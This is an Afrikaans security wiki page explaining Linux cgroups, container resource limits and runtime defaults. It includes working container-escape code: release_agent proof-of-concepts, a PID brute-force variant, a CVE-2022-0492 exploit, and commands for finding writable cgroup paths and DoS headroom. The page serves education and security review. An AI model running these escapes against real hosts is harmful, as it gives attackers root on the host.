# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Oorsig

Linux **control groups** is die kernmeganisme wat gebruik word om prosesse saam te groepeer vir rekeninghouding, beperking, prioritisering en beleidstoepassing. As namespaces hoofsaaklik gaan oor die isolering van die siening van hulpbronne, gaan cgroups hoofsaaklik oor die beheer van **hoeveel** van daardie hulpbronne 'n stel prosesse mag verbruik en, in sommige gevalle, **watter klasse hulpbronne** hulle oor die algemeen mag gebruik. Containers is konstant afhanklik van cgroups, selfs wanneer die gebruiker dit nooit direk bekyk nie, omdat byna elke moderne runtime 'n manier nodig het om aan die kernel te sê: "hierdie prosesse behoort aan hierdie werkbelasting, en dit is die hulpbronreëls wat op hulle van toepassing is".

Dit is hoekom container engines 'n nuwe container in sy eie cgroup-subboom plaas. Sodra die prosesboom daar is, kan die runtime geheue beperk, die aantal PIDs beperk, CPU-gebruik weeg, I/O reguleer en toesteltoegang beperk. In 'n produksie-omgewing is dit noodsaaklik beide vir multi-tenant veiligheid en vir eenvoudige operasionele higiëne. 'n Container sonder sinvolle hulpbronbeheer kan die geheue uitput, die stelsel met prosesse oorstroom of CPU en I/O monopolieer op maniere wat die gasheer of aangrensende workloads onstabiel maak.

Vanuit 'n sekuriteitsperspektief is cgroups op twee maniere van belang. Eerstens maak slegte of ontbrekende hulpbronbeperkings eenvoudige denial-of-service-aanvalle moontlik. Tweedens het sekere cgroup-funksies, veral in ouer **cgroup v1** opstellings, histories kragtige breakout-primitiewe geskep wanneer dit van binne 'n container geskryf kon word.

## v1 Vs v2

Daar is twee hoof cgroup-modelle in die praktyk. **cgroup v1** gee toegang tot verskeie controller-hiërargieë, en ouer exploit-writeups draai dikwels om die vreemde en soms te magtige semantiek wat daar beskikbaar is. **cgroup v2** bring 'n meer verenigde hiërargie en oor die algemeen netter gedrag. Moderne verspreidings verkies toenemend cgroup v2, maar gemengde of ouer omgewings bestaan steeds, wat beteken dat albei modelle relevant bly wanneer mens werklike stelsels hersien.

Die verskil maak saak omdat sommige van die bekendste container-breakout-verhale, soos misbruik van **`release_agent`** in cgroup v1, baie spesifiek aan ouer cgroup-gedrag gekoppel is. 'n Leser wat 'n cgroup-exploit op 'n blog sien en dit dan blinend op 'n moderne cgroup v2-only stelsel toepas, sal waarskynlik verkeerd verstaan wat op die teiken werklik moontlik is.

## Inspeksie

Die vinnigste manier om te sien waar jou huidige shell is:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
Die `/proc/self/cgroup`-lêer wys die cgroup-paaie wat met die huidige proses geassosieer is. Op 'n moderne cgroup v2-gasheer sal jy gewoonlik 'n verenigde inskrywing sien. Op ouer of hibriede gasheerstelsels kan jy verskeie v1 controller-paaie sien. Sodra jy die pad ken, kan jy die ooreenstemmende lêers onder `/sys/fs/cgroup` nagaan om limiete en huidige gebruik te sien.

Op 'n cgroup v2-gasheer is die volgende opdragte nuttig:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
Hierdie lêers openbaar watter controllers bestaan en watter aan child cgroups gedelegeer is. Hierdie delegasiemodel is belangrik in rootless en systemd-managed omgewings, waar die runtime dalk slegs die substel van cgroup-funksionaliteit kan beheer wat die ouerhiërargie werklik delegeer.

## Laboratorium

Een manier om cgroups in die praktyk waar te neem, is om 'n geheue-beperkte container te laat loop:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
Jy kan ook 'n PID-beperkte kontener probeer:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
Hierdie voorbeelde is nuttig omdat hulle help om die runtime-vlag met die kern se lêer-koppelvlak te verbind. Die runtime dwing nie die reël deur magie af nie; dit skryf die relevante cgroup-instellings en laat dan die kern dit teen die prosesboom afdwing.

## Runtime Usage

Docker, Podman, containerd, en CRI-O vertrou almal op cgroups as deel van normale werking. Die verskille gaan gewoonlik nie oor of hulle cgroups gebruik nie, maar oor **watter verstekwaardes hulle kies**, **hoe hulle met systemd integreer**, **hoe rootless-delegering werk**, en **hoeveel van die konfigurasie op enjin-vlak versus orkestrasie-vlak beheer word**.

In Kubernetes word hulpbronversoeke en limiete uiteindelik cgroup-konfigurasie op die node. Die pad van Pod YAML na kernafdwinging gaan deur die kubelet, die CRI runtime, en die OCI runtime, maar cgroups bly die kernmeganisme wat uiteindelik die reël toepas. In Incus/LXC-omgewings word cgroups ook intensief gebruik, veral omdat system containers dikwels 'n ryker prosesboom en meer VM-agtige bedryfsverwachtings ontsluit.

## Misconfigurasies en Uitbrake

Die klassieke cgroup-sekuriteitsverhaal is die skryfbare **cgroup v1 `release_agent`**-meganisme. In daardie model, as 'n aanvaller na die regte cgroup-lêers kon skryf, `notify_on_release` kon aktiveer, en die pad wat in `release_agent` gestoor is kon beheer, kon die kern uiteindelik 'n aanvaller-gekose pad in die initial namespaces op die gasheer uitvoer toe die cgroup leeg geword het. Daarom gee ouer skrywes soveel aandag aan cgroup-controller skryfbaarheid, mount-opsies, en namespace/kapabiliteitstoestande.

Selfs wanneer `release_agent` nie beskikbaar is nie, maak cgroup-foute steeds saak. Oormatige toesteltoegang kan gasheer-toestelle van die container af bereikbaar maak. Ontbrekende geheue- en PID-limiete kan 'n eenvoudige kode-uitvoering in 'n gasheer-DoS omskakel. Swakke cgroup-delegering in rootless-scenario's kan ook verdedigers mislei om te dink daar bestaan 'n beperking wanneer die runtime nooit eintlik daarin geslaag het om dit toe te pas nie.

### `release_agent` Agtergrond

Die `release_agent` tegniek geld slegs vir **cgroup v1**. Die basiese idee is dat wanneer die laaste proses in 'n cgroup uitgaan en `notify_on_release=1` gestel is, die kern die program uitvoer waarvan die pad in `release_agent` gestoor is. Daardie uitvoering gebeur in die **initial namespaces op die gasheer**, wat 'n skryfbare `release_agent` in 'n container-ontsnap-primitive omskep.

Vir die tegniek om te werk, het die aanvaller gewoonlik nodig:

- 'n skryfbare **cgroup v1** hiërargie
- die vermoë om 'n child cgroup te skep of te gebruik
- die vermoë om `notify_on_release` te stel
- die vermoë om 'n pad in `release_agent` te skryf
- 'n pad wat vanuit die gasheer se oogpunt na 'n uitvoerbare lêer oplos

### Klassieke PoC

Die historiese eenreël PoC is:
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
Hierdie PoC skryf 'n payload-pad na `release_agent`, trigger die cgroup release, en lees dan die uitsetlêer wat op die host gegenereer is terug.

### Leesbare stap-vir-stap

Dieselfde idee is makliker om te verstaan as dit in stappe opgebreek word.

1. Skep en berei 'n skryfbare cgroup voor:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. Identifiseer die host path wat ooreenstem met die container filesystem:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. Plaas 'n payload wat vanaf die host path sigbaar sal wees:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. Laat uitvoering plaasvind deur die cgroup leeg te maak:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
Die effek is host-side uitvoering van die payload met host root privileges. In 'n werklike exploit skryf die payload gewoonlik 'n proof file, spawn 'n reverse shell, of wysig host state.

### Relatiewe-padvariant wat `/proc/<pid>/root` gebruik

In sommige omgewings is die host pad na die container lêerstelsel nie duidelik nie of is dit deur die storage driver weggesteek. In daardie geval kan die payload path uitgedruk word deur `/proc/<pid>/root/...`, waar `<pid>` 'n host PID is wat behoort aan 'n proses in die huidige container. Dit is die basis van die relative-path brute-force variant:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
Die relevante truuk hier is nie die brute force self nie maar die padvorm: `/proc/<pid>/root/...` laat die kernel 'n lêer binne die container se lêerstelsel vanuit die host namespace oplos, selfs wanneer die direkte host-stoorpad nie vooraf bekend is nie.

### CVE-2022-0492 Variasie

In 2022 het CVE-2022-0492 getoon dat skryf na `release_agent` in cgroup v1 nie korrek gekontroleer het vir `CAP_SYS_ADMIN` in die **aanvanklike** user namespace nie. Dit het die tegniek baie meer bereikbaar gemaak op kwesbare kernels omdat 'n container-proses wat 'n cgroup-hiërargie kon mount, `release_agent` kon skryf sonder om reeds voorregte in die host user namespace te hê.

Minimale exploit:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Op 'n kwesbare kernel voer die host `/proc/self/exe` uit met host root privileges.

Vir praktiese misbruik, begin deur te kontroleer of die omgewing steeds skryfbare cgroup-v1-paaie of gevaarlike toesteltoegang openbaar:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
As `release_agent` aanwesig en skryfbaar is, is jy reeds in legacy-breakout-gebied:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
As die cgroup path self nie 'n escape oplewer nie, is die volgende praktiese gebruik dikwels denial of service of reconnaissance:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
Hierdie opdragte vertel jou vinnig of die werkbelasting ruimte het om te fork-bomb, geheue aggressief te verbruik, of 'n skryfbare ou cgroup-koppelvlak te misbruik.

## Kontroles

Wanneer jy 'n teiken hersien, is die doel van die cgroup-kontroles om uit te vind watter cgroup-model in gebruik is, of die container skryfbare controller-paaie kan sien, en of ou breakout-primitiewe soos `release_agent` selfs relevant is.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
Wat hier interessant is:

- If `mount | grep cgroup` shows **cgroup v1**, older breakout writeups become more relevant.
- If `release_agent` exists and is reachable, that is immediately worth deeper investigation.
- If the visible cgroup hierarchy is writable and the container also has strong capabilities, the environment deserves much closer review.

If you discover **cgroup v1**, writable controller mounts, and a container that also has strong capabilities or weak seccomp/AppArmor protection, that combination deserves careful attention. cgroups are often treated as a boring resource-management topic, but historically they have been part of some of the most instructive container escape chains precisely because the boundary between "resource control" and "host influence" was not always as clean as people assumed.

## Runtime-standaarde

| Runtime / platform | Standaardtoestand | Standaardgedrag | Algemene handmatige verswakking |
| --- | --- | --- | --- |
| Docker Engine | Standaard geaktiveer | Containers word outomaties in cgroups geplaas; hulpbronbeperkings is opsioneel tensy met vlae gestel | weglating van `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
| Podman | Standaard geaktiveer | `--cgroups=enabled` is die standaard; cgroup namespace-standaarde wissel na gelang van die cgroup-weergawe (`private` op cgroup v2, `host` op sommige cgroup v1 opstellings) | `--cgroups=disabled`, `--cgroupns=host`, verslapte toesteltoegang, `--privileged` |
| Kubernetes | Standaard geaktiveer deur die runtime | Pods en containers word deur die node runtime in cgroups geplaas; fynkorrelige hulpbronbeheer hang af van `resources.requests` / `resources.limits` | weglating van resource requests/limits, privileged device access, hostvlak runtime wankonfigurasie |
| containerd / CRI-O | Standaard geaktiveer | cgroups is deel van normale lewensiklusbestuur | direkte runtime-konfigurasies wat toestelbeheer verslap of ouer skryfbare cgroup v1-koppelvlakke blootstel |

Die belangrike onderskeid is dat **cgroup bestaan** gewoonlik standaard is, terwyl **bruikbare hulpbronbeperkings** dikwels opsioneel is tensy uitdruklik gekonfigureer.
